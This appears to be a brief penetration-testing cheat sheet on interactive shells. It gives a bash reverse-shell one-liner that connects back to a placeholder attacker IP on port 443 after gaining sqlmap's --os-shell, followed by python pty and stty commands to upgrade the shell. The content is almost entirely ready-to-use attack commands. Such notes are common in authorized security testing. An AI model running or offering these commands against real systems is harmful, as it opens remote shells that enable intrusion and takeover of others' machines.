# Interactive Shells

Reverse Shell Payload after --os-shell from sqlmap :&#x20;

```bash
bash -c "bash -i >& /dev/tcp/%attacker_box_IP%/443 0>&1"
```

Upgrade to an interactive shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
stty raw -echo
```

